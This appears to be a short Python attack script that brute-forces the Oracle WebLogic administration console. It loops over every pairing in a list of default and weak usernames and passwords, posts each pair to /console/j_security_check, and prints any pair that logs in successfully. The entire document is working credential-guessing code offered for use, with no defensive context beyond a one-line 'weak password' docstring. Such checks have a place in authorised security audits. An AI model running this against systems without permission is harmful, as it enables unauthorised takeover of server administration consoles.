import requests


print('[*]Usage: [IP] [PORT]')
def check(url,port=7001):
    """weak password"""

    pwddict = ['WebLogic', 'weblogic', 'Oracle@123', 'password', 'system', 'Administrator', 'admin', 'security', 'joe', 'wlcsystem', 'wlpisystem']
    for user in pwddict:
        for pwd in pwddict:
            data = {
                'j_username':user,
                'j_password':pwd,
                'j_character_encoding':'UTF-8'
            }
            req = requests.post('http://'+url+':'+str(port)+'/console/j_security_check', data=data, allow_redirects=False, verify=False, timeout=3)

            if req.status_code == 302 and 'console' in req.text and 'LoginForm.jsp' not in req.text:
                print('[+] WebLogic username: '+user+'  password: '+pwd)
                return
    print('[-]don not have weakPass!')
